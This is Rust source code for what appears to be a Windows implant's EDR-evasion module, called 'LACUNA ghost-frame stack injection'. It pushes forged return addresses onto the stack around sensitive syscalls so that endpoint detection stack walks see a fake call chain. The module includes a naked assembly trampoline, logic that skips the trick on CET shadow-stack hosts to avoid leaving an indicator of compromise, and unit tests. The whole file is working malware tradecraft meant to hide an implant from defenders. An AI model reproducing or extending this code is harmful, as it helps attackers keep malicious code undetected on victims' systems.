//! LACUNA ghost-frame stack injection — BYOUD-Gap leaf frame spoofing.
//!
//! Injects ghost return addresses onto the stack before sensitive syscalls
//! so that EDR call-stack sampling (via RtlVirtualUnwind / ETW STACKWALK)
//! sees a chain of .pdata lacuna addresses instead of the implant's real
//! call chain. Each ghost address, when processed by the unwinder, returns
//! NULL from RtlLookupFunctionEntry → treated as leaf frame → RSP += 8.
//!
//! ## How it works
//! Before a syscall:
//!   [real return addr]     ← what EDR would normally see
//!   [ghost_frame_N]        ← fake (win32u NOP gap)
//!   ...
//!   [ghost_frame_0]        ← fake (ntdll exception anchor)
//!   [syscall return addr]  ← real, points back to implant
//!   ─── RSP ───
//!
//! After the syscall returns, the ghost frames are popped off the stack
//! and execution continues normally. The ghost frames are ONLY present
//! during the syscall window when EDR might sample the stack.
//!
//! ## CET behavior (audited 2026-08)
//! Execution layer: **#CP-safe even on shadow-stack hosts.** The naked
//! trampoline never `ret`s THROUGH a ghost frame — every `call`/`ret` it
//! executes is balanced (shadow-stack push/pop matched), and RSP is restored
//! with `mov rsp, rbx` instead of unwinding the fake frames. The ghost
//! addresses are pure stack *data* an unwinder reads, never `ret` targets.
//!
//! So why the runtime CET gate in [`with_ghost_stack`]? On a shadow-stack
//! host the forged chain is (a) worthless — a shadow-stack-aware stack walk
//! (Win11 24H2+ telemetry) reads the REAL call chain from the shadow stack
//! and never sees our ghosts — and (b) an IOC: the plain-stack/shadow-stack
//! divergence is exactly what that telemetry flags. Degrading to a direct
//! call when CET is on avoids stamping a known-bad pattern for zero gain.
//! Mirrors the `swap::should_execute` degrade in `implant-core/src/stack.rs`.

#![cfg(target_os = "windows")]

use crate::lacuna::GhostChain;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use nyx_implant_core::heap::Vec;

/// Hard cap on the number of ghost frames with_ghost_stack will inject.
/// Bounds the slot count the `ghost_stack_enter` trampoline allocates/copies
/// so a corrupted/huge CHAIN_LEN can't make it run past the static buffer or
/// flood the stack. 32 frames = 256 B of stack — far more than any realistic
/// EDR stack-walk depth (typically the first few frames decide "legit").
/// Also bounds the static buffer install_ghost_chain leaks.
const MAX_GHOST_DEPTH: usize = 32;

/// Cached ghost chain built at bootstrap. `0` = not yet scanned.
static CHAIN_FRAMES: AtomicUsize = AtomicUsize::new(0);
static CHAIN_LEN: AtomicUsize = AtomicUsize::new(0);
static CHAIN_READY: AtomicBool = AtomicBool::new(false);

/// Install a ghost chain for stack injection. Called at bootstrap after
/// LACUNA scanning. `frames` is leaked into a static — lives for the
/// process lifetime (implant never tears down).
pub fn install_ghost_chain(chain: &GhostChain) {
    if chain.frames.is_empty() {
        return;
    }
    let len = chain.frames.len();
    // Bound the depth we ever install: protects the frames_len * 8 multiply in
    // with_ghost_stack from overflow on a corrupted/huge chain, and caps the
    // process-lifetime leak. MAX_GHOST_DEPTH = 32.
    let len = if len > MAX_GHOST_DEPTH {
        MAX_GHOST_DEPTH
    } else {
        len
    };
    let src_slice: &[usize] = &chain.frames[..len];

    let Some(buf) = install_ghost_chain_alloc_static(src_slice) else {
        return;
    };
    // Defensive: slab already initialized by extend_from_slice above; this
    // copy is a no-op overlay guaranteeing the content matches src_slice even
    // if a future refactor changes the construction path.
    buf.copy_from_slice(src_slice);
    CHAIN_FRAMES.store(buf.as_ptr() as usize, Ordering::Release);
    CHAIN_LEN.store(len, Ordering::Release);
    CHAIN_READY.store(true, Ordering::Release);
}

/// Allocate a process-lifetime static buffer holding the ghost frames.
/// Returns `None` if the allocation didn't satisfy the request (the caller
/// bails without arming the chain).
fn install_ghost_chain_alloc_static(src_slice: &[usize]) -> Option<&'static mut [usize]> {
    let len = src_slice.len();
    // Allocate a static buffer for the frames. The previous code did
    // `Vec::with_capacity(len)` then `as_ptr() as *mut` then `forget(v)` then
    // `from_raw_parts_mut(ptr, len)` then `copy_from_slice` — but
    // with_capacity leaves len slots UNINITIALIZED, so from_raw_parts_mut
    // reinterpreted them as initialized = UB, and under OOM (capacity 0,
    // dangling ptr) it was instant UB. We instead initialize the slots FIRST
    // (extend_from_slice writes len items, setting v.len == len) and only then
    // detach the buffer from the Vec via forget. We also re-check capacity +
    // length after the extend to defend against a degenerate allocator.
    let mut v: Vec<usize> = Vec::with_capacity(len);
    v.extend_from_slice(src_slice);
    // extend_from_slice guarantees v.len() == src_slice.len() == len on
    // success; if the allocator failed to grow, Vec's grow path aborts
    // (panic = "abort" here), so we never observe a short write. Defense
    // in depth: still assert before taking the pointer.
    if v.capacity() < len || v.len() != len {
        // Allocation did not satisfy the request — bail without arming the
        // chain; with_ghost_stack will degrade to a direct f() call.
        return None;
    }
    let ptr = v.as_mut_ptr();
    // SAFETY: v now holds exactly `len` initialized usize slots laid out
    // contiguously at `ptr`. We transfer ownership to the static slice and
    // forget the Vec so its destructor does not free the backing store
    // (the slice now owns it for the process lifetime — the implant never
    // tears down, matching the leak pattern of GLOBAL_GAP_POOL in
    // stack.rs). Because the slots were written BEFORE forget, the slice
    // observes only initialized memory — no UB.
    let slab = unsafe { core::slice::from_raw_parts_mut(ptr, len) };
    core::mem::forget(v);
    Some(slab)
}

/// Execute `closure` with ghost frames injected onto the stack.
/// While `closure` runs, EDR stack sampling will see the ghost chain
/// instead of the real call stack.
///
/// # Safety
/// `closure` must not unwind (panic/exception) while ghost frames are
/// on the stack — the stack would be corrupted.
///
/// The ghost window is laid down by [`ghost_stack_enter`], a naked
/// trampoline: the closure is invoked as a normal ABI call with the ghost
/// frames above its frame, and RSP is restored from a callee-saved base on
/// the way out. No inline `asm!` ever moves RSP inside a compiler-managed
/// frame, so this is correct at opt-level-0 as well as release (the
/// previous push/`call`-across-`asm!`-blocks scheme corrupted the dev-profile
/// stack because codegen kept live state in RSP-relative slots it believed
/// were stationary). No heap allocation, no function pointers through CFG.
#[inline(never)]
pub unsafe fn with_ghost_stack<F: FnOnce()>(f: F) {
    // CET gate (see module docs): on a shadow-stack host the ghost window
    // buys nothing and its plain-stack/shadow-stack divergence is an IOC —
    // degrade to a direct call. Probed at every call via the cached
    // `version::cet_active()` (same feature-41 query as
    // `caller_spoof::is_cet_enabled`, so the whole crate agrees).
    if !ghost_window_permitted(nyx_implant_core::version::cet_active()) {
        f();
        return;
    }

    if !CHAIN_READY.load(Ordering::Acquire) {
        f();
        return;
    }

    let frames_ptr = CHAIN_FRAMES.load(Ordering::Acquire) as *const usize;
    let frames_len_raw = CHAIN_LEN.load(Ordering::Acquire);

    if frames_ptr.is_null() || frames_len_raw == 0 {
        f();
        return;
    }

    let frames_len = with_ghost_stack_clamp(frames_len_raw);

    // Type-erase the FnOnce behind an FnMut shim so the naked trampoline can
    // reach it through a plain fn pointer. `f` stays owned by THIS frame —
    // the shim only borrows it — so F: Drop runs exactly once, here.
    let mut f = Some(f);
    let mut shim = || {
        if let Some(f) = f.take() {
            f();
        }
    };
    let mut shim_dyn: &mut dyn FnMut() = &mut shim;

    // SAFETY: `frames_ptr`/`frames_len` describe a live, clamped chain (see
    // install_ghost_chain); `shim_dyn` outlives the call; the closure does
    // not unwind (caller contract).
    unsafe {
        ghost_stack_enter(
            frames_ptr,
            frames_len,
            ghost_inner_shim,
            &mut shim_dyn as *mut _ as *mut core::ffi::c_void,
        );
    }
}

/// Trampoline target: invoke the type-erased closure inside the ghost
/// window laid down by `ghost_stack_enter`. A normal compiled function —
/// called via the standard ABI, so its own prologue/locals are sound in
/// every codegen profile.
///
/// # Safety
/// `data` must be the `&mut &mut dyn FnMut()` installed by
/// `with_ghost_stack`, valid for the duration of this call.
unsafe extern "C" fn ghost_inner_shim(data: *mut core::ffi::c_void) {
    // SAFETY: per the caller contract above.
    let f = unsafe { &mut *(data as *mut &mut dyn FnMut()) };
    f();
}

/// Naked ghost-window trampoline. `#[unsafe(naked)]` so the compiler CANNOT
/// emit a prologue or stack frame in ANY codegen profile — same mechanism
/// as `implant_win::dllmain::DllMain`. The whole body is hand-written asm,
/// so every RSP movement is explicit and the compiler has no RSP-relative
/// state of its own to corrupt.
///
/// Steps (Win64 ABI: rcx = frames_ptr, rdx = frames_len, r8 = inner,
/// r9 = inner_data):
///   1. `push rbx/rsi/rdi` — rep movsq needs rsi+rdi and we need a frame
///      base; all three are CALLEE-SAVED in the Win64 ABI, so the naked fn
///      must preserve them itself (no compiler does it for us — missing
///      this corrupted release-profile callers that keep live values in
///      rsi/rdi). Three pushes also leave RSP 16-aligned.
///   2. `rbx` = frame base; `sub rsp, slots*8` with `slots = (len+1) & !1`
///      (even slot count keeps RSP 16-aligned at the `call`, and provides a
///      pad slot when `len` is odd).
///   3. `rep movsq` copies frames[0..len] to [rsp..]; slot k gets frames[k],
///      byte-identical to the old reverse-`push` layout (frames[0] lowest,
///      adjacent to the real return address — the exception anchor).
///   4. Pad slot (odd `len` only) duplicates frames[len-1] — a valid lacuna
///      address, so the chain stays unwinder-clean.
///   5. `inner(inner_data)` runs the closure inside the window.
///   6. `mov rsp, rbx; pop rdi/rsi/rbx; ret` restores RSP exactly — no
///      `frames_len * 8` recompute, so push/pop can never drift apart.
///
/// # Safety
/// `frames_ptr` must point to `frames_len` readable qwords (0 < len <=
/// MAX_GHOST_DEPTH); `inner`/`inner_data` must be a valid trampoline pair.
#[unsafe(naked)]
unsafe extern "C" fn ghost_stack_enter(
    frames_ptr: *const usize,
    frames_len: usize,
    inner: unsafe extern "C" fn(*mut core::ffi::c_void),
    inner_data: *mut core::ffi::c_void,
) {
    core::arch::naked_asm!(
        // Preserve every callee-saved reg we touch; establish a
        // compiler-free frame with rbx = base (16-byte aligned after the
        // three pushes: entry RSP ≡ 8 mod 16, +3*8 → ≡ 0).
        "push rbx",
        "push rsi",
        "push rdi",
        "mov rbx, rsp",
        // slots = (frames_len + 1) & !1; bytes = slots * 8 (multiple of 16,
        // so RSP stays 16-aligned for the call below).
        "lea rax, [rdx + 1]",
        "and rax, -2",
        "shl rax, 3",
        "sub rsp, rax",
        // Keep the call target in regs that survive rep movsq.
        "mov r10, r8", // inner fn ptr
        "mov r11, r9", // inner data
        // Copy frames[0..len] linearly: rsi = src, rdi = dst, rcx = count.
        "mov rsi, rcx",
        "mov rdi, rsp",
        "mov rcx, rdx",
        "rep movsq",
        // Odd len: fill the pad slot (rsi/rdi now point one past the end)
        // with a duplicate of the last ghost frame.
        "test rdx, 1",
        "jz 2f",
        "mov rax, [rsi - 8]",
        "mov [rdi], rax",
        "2:",
        // inner(inner_data) — RSP is 16-aligned here per the Win64 ABI.
        "mov rcx, r11",
        "call r10",
        // Restore RSP from the saved base; no length recompute.
        "mov rsp, rbx",
        "pop rdi",
        "pop rsi",
        "pop rbx",
        "ret",
    );
}

/// Clamp the effective depth to MAX_GHOST_DEPTH. install_ghost_chain
/// already caps the stored length at 32, so for any chain installed by the
/// fixed code this is a no-op; the clamp exists so a stale/legacy chain (or
/// a corrupted CHAIN_LEN) cannot drive the trampoline's slot count past the
/// static buffer it copies from.
fn with_ghost_stack_clamp(frames_len_raw: usize) -> usize {
    if frames_len_raw > MAX_GHOST_DEPTH {
        MAX_GHOST_DEPTH
    } else {
        frames_len_raw
    }
}

/// Pure CET gate decision for the ghost window. Returns `false` (degrade to
/// a direct call) when user-mode shadow stack is active for this process —
/// see the module-level "CET behavior" note for why the window is degraded
/// even though the trampoline itself is #CP-safe. Extracted as a pure fn so
/// the decision is unit-testable without CET hardware (wine64 reports CET
/// off; the tests pin the DECISION, not the bit).
fn ghost_window_permitted(cet_on: bool) -> bool {
    !cet_on
}

// NOTE: these tests mutate the global chain statics; run with
// `--test-threads=1`.
#[cfg(test)]
mod tests {
    use super::*;
    use crate::lacuna::GhostChain;

    /// The depth clamp: at/under MAX_GHOST_DEPTH passes through, above clamps.
    #[test]
    fn clamp_caps_at_max_ghost_depth() {
        assert_eq!(with_ghost_stack_clamp(0), 0);
        assert_eq!(with_ghost_stack_clamp(5), 5);
        assert_eq!(with_ghost_stack_clamp(MAX_GHOST_DEPTH), MAX_GHOST_DEPTH);
        assert_eq!(with_ghost_stack_clamp(MAX_GHOST_DEPTH + 1), MAX_GHOST_DEPTH);
        assert_eq!(with_ghost_stack_clamp(usize::MAX), MAX_GHOST_DEPTH);
    }

    /// The CET gate decision: permitted when CET is off, degraded to a direct
    /// call when on. Pure mapping — wine64 cannot flip the hardware shadow-
    /// stack bit, so this pins the decision the live probe feeds, not the bit.
    #[test]
    fn ghost_window_permitted_gate() {
        assert!(ghost_window_permitted(false));
        assert!(!ghost_window_permitted(true));
    }

    /// Installing an oversized chain stores exactly MAX_GHOST_DEPTH frames —
    /// the CRITICAL-9 bound on the trampoline's slot count.
    #[test]
    fn install_clamps_oversized_chain() {
        let frames: Vec<usize> = (0..40).map(|i| i * 0x1000).collect();
        install_ghost_chain(&GhostChain { frames });
        assert!(CHAIN_READY.load(Ordering::Acquire));
        assert_eq!(CHAIN_LEN.load(Ordering::Acquire), MAX_GHOST_DEPTH);
        let ptr = CHAIN_FRAMES.load(Ordering::Acquire) as *const usize;
        assert!(!ptr.is_null());
        // Content must match the first 32 installed frames.
        unsafe {
            assert_eq!(core::ptr::read(ptr), 0);
            assert_eq!(core::ptr::read(ptr.add(31)), 31 * 0x1000);
        }
    }

    /// End-to-end: with a chain armed, the closure executes inside the ghost
    /// window and control returns with the stack intact (execution continuing
    /// at all is the RSP-restore proof — a window-teardown mismatch would
    /// fault). Runs in BOTH debug and release profiles: the naked trampoline
    /// (`ghost_stack_enter`) owns the whole RSP window, so opt-level-0 codegen
    /// has no hidden RSP-relative state to corrupt.
    #[test]
    fn with_ghost_stack_runs_closure_and_restores_rsp() {
        let frames: Vec<usize> = std::vec![0x1111_1111, 0x2222_2222, 0x3333_3333];
        install_ghost_chain(&GhostChain { frames });
        let rsp_before: usize;
        unsafe {
            core::arch::asm!("mov {}, rsp", out(reg) rsp_before, options(nomem, preserves_flags));
        }
        let mut ran = false;
        unsafe {
            with_ghost_stack(|| ran = true);
        }
        assert!(ran);
        let rsp_after: usize;
        unsafe {
            core::arch::asm!("mov {}, rsp", out(reg) rsp_after, options(nomem, preserves_flags));
        }
        assert_eq!(
            rsp_before, rsp_after,
            "ghost frames must be popped exactly: before={:#018x} after={:#018x}",
            rsp_before, rsp_after
        );
    }
}
